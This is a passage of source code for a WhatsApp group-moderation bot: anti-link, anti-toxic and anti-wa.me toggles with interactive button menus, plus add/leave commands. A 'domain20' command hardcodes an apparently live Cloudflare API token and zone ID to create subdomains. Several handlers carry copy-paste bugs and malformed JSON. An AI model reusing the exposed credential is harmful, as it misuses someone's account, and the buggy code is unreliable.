            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await Dare.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
    case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Should Be Admins First_')
if (!isAdmins && !DareTheCreator) return reply('Admin only!!')
if (args[0] === "on") {
if (AntiLinkYoutubeChannel) return replydare('Already activated')
ntilinkytch.push(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
replydare('Success in turning on youtube channel antilink in this group')
var groupe = await Dare.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Dare.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube channel link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeChannel) return replydare('Already deactivated')
let off = ntilinkytch.indexOf(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
ntilinkytch.splice(off, 1)
replydare('Success in turning off youtube channel antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hey ${pushname}\nPlease click the button below to use _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: Dare.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"SELECT ON/OFF ♨️",
                "sections":[{
                  "title":"SELECT ON/OFF ",
                  "rows":[{
                    "header":"TURN IT ON 🙂",
                    "title":"CHOOSE ",
                    "description":"ON 🙂",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"DEADLY ❌",
                    "title":"CHOOSE ",
                    "description":"DEADLY ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '100000000000000000@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await Dare.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
      case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Must Become Admins First_')
if (!isAdmins && !DareTheCreator) return reply('Admin only!!')
if (args[0] === "on") {
if (AntiLinkInstagram) return replydare('Already activated')
ntilinkig.push(from)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
replydare('Success in turning on instagram antilink in this group')
var groupe = await Dare.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Dare.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the instagram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkInstagram) return replydare('Already deactivated')
let off = ntilinkig.indexOf(from)
ntilinkig.splice(off, 1)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
replydare('Success in turning off instagram antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hey ${pushname}\nPlease click the button below to use _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: Dare.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"SELECT ON/OFF ♨️",
                "sections":[{
                  "title":"SELECT ON/OFF ",
                  "rows":[{
                    "header":"TURN IT ON 🙂",
                    "title":"CHOOSE ",
                    "description":"ON 🙂",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"DEADLY ❌",
                    "title":"CHOOSE ",
                    "description":"DEADLY ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '100000000000000000@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await Dare.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
        case 'antilinkfacebook': case 'antilinkfb': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Should Be Admins First_')
if (!isAdmins && !DareTheCreator) return reply('Admin only!!')
if (args[0] === "on") {
if (AntiLinkFacebook) return replydare('Already activated')
ntilinkfb.push(from)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
replydare('Success in turning on facebook antilink in this group')
var groupe = await Dare.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Dare.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the facebook link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return replydare('Already deactivated')
let off = ntilinkfb.indexOf(from)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
replydare('Success in turning off facebook antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `𝙎𝘼𝙇𝘼𝙈 🥇 ${pushname}\nPlease click the button below to use_*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: Dare.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"SELECT ON/OFF ♨️",
                "sections":[{
                  "title":"SELECT ON/OFF ",
                  "rows":[{
                    "header":"TURN IT ON 🙂",
                    "title":"CHOOSE ",
                    "description":"ON 🙂",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"DEADLY ❌",
                    "title":"CHOOSE ",
                    "description":"DEADLY ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '100000000000000000@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await Dare.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
          case 'antilinktelegram': case 'antilinktg': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Should Be Admins First_')
if (!isAdmins && !DareTheCreator) return reply('Admin only!!')
if (args[0] === "on") {
if (AntiLinkTelegram) return replydare('Already activated')
ntilinktg.push(from)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
replydare('Success in turning on telegram antilink in this group')
var groupe = await Dare.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Dare.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the telegram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return replydare('Already deactivated')
let off = ntilinktg.indexOf(from)
ntilinktg.splice(off, 1)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
replydare('Success in turning off telegram antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hey ${pushname}\nPlease click the button below to use_*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: Dare.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"SELECT ON/OFF ♨️",
                "sections":[{
                  "title":"SELECT ON/OFF ",
                  "rows":[{
                    "header":"TURN IT ON 🙂",
                    "title":"CHOOSE ",
                    "description":"ON 🙂",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"DEADLY ❌",
                    "title":"CHOOSE ",
                    "description":"DEADLY ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '100000000000000000@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await Dare.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
            case 'antilinktiktok': case 'antilinktt': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Should Be Admins First_')
if (!isAdmins && !DareTheCreator) return reply('Admin only!!')
if (args[0] === "on") {
if (AntiLinkTiktok) return replydare('Already activated')
ntilinktt.push(from)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
replydare('Success in turning on tiktok antilink in this group')
var groupe = await Dare.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Dare.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the tiktok link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTiktok) return replydare('Already deactivated')
let off = ntilinktt.indexOf(from)
ntilinktt.splice(off, 1)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
replydare('Success in turning off tiktok antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hey ${pushname}\nPlease click the button below to use_*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: Dare.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"SELECT ON/OFF ♨️",
                "sections":[{
                  "title":"SELECT ON/OFF ",
                  "rows":[{
                    "header":"TURN IT ON 🙂",
                    "title":"CHOOSE ",
                    "description":"ON 🙂",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"DEADLY ❌",
                    "title":"CHOOSE ",
                    "description":"DEADLY ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '100000000000000000@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await Dare.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
            case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Should Be Admins First_')
if (!isAdmins && !DareTheCreator) return reply('Admin only!!')
if (args[0] === "on") {
if (AntiLinkTwitter) return replydare('Already activated')
ntilinktwt.push(from)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
replydare('Success in turning on twitter antilink in this group')
var groupe = await Dare.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Dare.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the twitter link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTwitter) return replydare('Already deactivated')
let off = ntilinktwt.indexOf(from)
ntilinktwt.splice(off, 1)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
replydare('Success in turning off twitter antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hey ${pushname}\nPlease click the button below to use_*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: Dare.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"SELECT ON/OFF ♨️",
                "sections":[{
                  "title":"SELECT ON/OFF ",
                  "rows":[{
                    "header":"TURN IT ON 🙂",
                    "title":"CHOOSE ",
                    "description":"ON 🙂",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"DEADLY ❌",
                    "title":"CHOOSE ",
                    "description":"DEADLY ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '100000000000000000@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await Dare.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
              case 'forbidden10':
		case 'antilink':{
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Should Be Admins First_')
if (!isAdmins && !DareTheCreator) return reply('Admin only!!')
if (args[0] === "on") {
if (AntiLinkTwitter) return replydare('Already activated')
ntilinkall.push(from)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
replydare('Success in turning on all antilink in this group')
var groupe = await Dare.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Dare.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send any link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return replydare('Already deactivated')
let off = ntilinkall.indexOf(from)
ntilinkall.splice(off, 1)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
replydare('Success in turning off all antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `𝙎𝘼𝙇𝘼𝙈 🥇 ${pushname}\nPlease click the button below to use_*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: Dare.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"SELECT ON/OFF ♨️",
                "sections":[{
                  "title":"SELECT ON/OFF ",
                  "rows":[{
                    "header":"TURN IT ON 🙂",
                    "title":"CHOOSE ",
                    "description":"ON 🙂",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"DEADLY ❌",
                    "title":"CHOOSE ",
                    "description":"DEADLY ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '100000000000000000@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await Dare.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
case 'antitoxic': case 'antibadword': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Should Be Admins First_')
if (!isAdmins && !DareTheCreator) return reply('Admin only!!')
if (args[0] === "on") {
if (antiToxic) return replydare('Already activated')
nttoxic.push(from)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
replydare('Success in turning on antitoxic in this group')
var groupe = await Dare.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Dare.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to use bad words in this group, one who uses will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiToxic) return replydare('Already deactivated')
let off = nttoxic.indexOf(from)
nttoxic.splice(off, 1)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
replydare('Success in turning off antitoxic in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hey ${pushname}\nPlease click the button below to use_*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: Dare.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"SELECT ON/OFF ♨️",
                "sections":[{
                  "title":"SELECT ON/OFF ",
                  "rows":[{
                    "header":"TURN IT ON 🙂",
                    "title":"CHOOSE ",
                    "description":"ON 🙂",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"DEADLY ❌",
                    "title":"CHOOSE ",
                    "description":"DEADLY ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '100000000000000000@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await Dare.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
case 'antiwame': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Must Become Admins First_')
if (!isAdmins && !DareTheCreator) return reply('Admin only!!')
if (args[0] === "on") {
if (antiWame) return replydare('Already activated')
ntwame.push(from)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
replydare('Success in turning on antiwame in this group')
var groupe = await Dare.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Dare.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send wa.me in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiWame) return replydare('Already deactivated')
let off = nttoxic.indexOf(from)
ntwame.splice(off, 1)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
replydare('Success in turning off antiwame in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `𝙎𝘼𝙇𝘼𝙈 🥇 ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: Dare.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"SELECT ON/OFF ♨️",
                "sections":[{
                  "title":"SELECT ON/OFF ",
                  "rows":[{
                    "header":TURN IT ON 🙂",
                    "title":"CHOOSE ",
                    "description":“TURN ON 🙂",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":“DEADLY ❌",
                    "title":"CHOOSE ",
                    "description":“DEADLY ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '100000000000000000@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await Dare.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
case 'antilinkgc': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Must Become Admins First_')
if (!isAdmins && !DareTheCreator) return reply('Admin only!!')
if (args[0] === "on") {
if (Antilinkgc) return replydare('Already activated')
ntlinkgc.push(from)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
replydare('Success in turning on antiwame in this group')
var groupe = await Dare.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Dare.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!Antilinkgc) return replydare('Already deactivated')
let off = ntlinkgc.indexOf(from)
ntlinkgc.splice(off, 1)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
replydare('Success in turning off antiwame in this group')
} else {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `𝙎𝘼𝙇𝘼𝙈 🥇 ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: Dare.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"SELECT ON/OFF ♨️",
                "sections":[{
                  "title":"SELECT ON/OFF ",
                  "rows":[{
                    "header":TURN IT ON 🙂",
                    "title":"CHOOSE ",
                    "description":“TURN ON 🙂",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":“DEADLY ❌",
                    "title":"CHOOSE ",
                    "description":“DEADLY ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '100000000000000000@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await Dare.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
case 'domain20': {
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f2bc5ee0d4471aa74dd689c297c7aa43";
               let apitoken = "cTJzNrTtWoTkj9d-LueQAnBtgVA4-3MZMUc9bTgE";
               let tld = "panellofficial.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replydare("PENGGUNAAN .domain4 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replydare("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replydare(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) replydare(`*_Berhasil Menambah Subdomain🙂_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By celiaofficial⚡_*`);
             else replydare(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
           break
  
   case 'leavegc':
case 'left': {
if (!DareTheCreator) return reply(mess.only.owner)
await Dare.groupLeave(m.chat)
await replydare(`Done`)
            }
            break
case 'add': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Must Become Admins First_')
if (!DareTheCreator) return reply(mess.only.owner)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Dare.groupParticipantsUpdate(m.chat, [users], 'add')
await replydare(`Done`)
}
break
case 'closetime': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !DareTheCreator) return reply('Admin only!!')
if (!isBotAdmins) return reply('_Bots Must Become Admins First_')
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
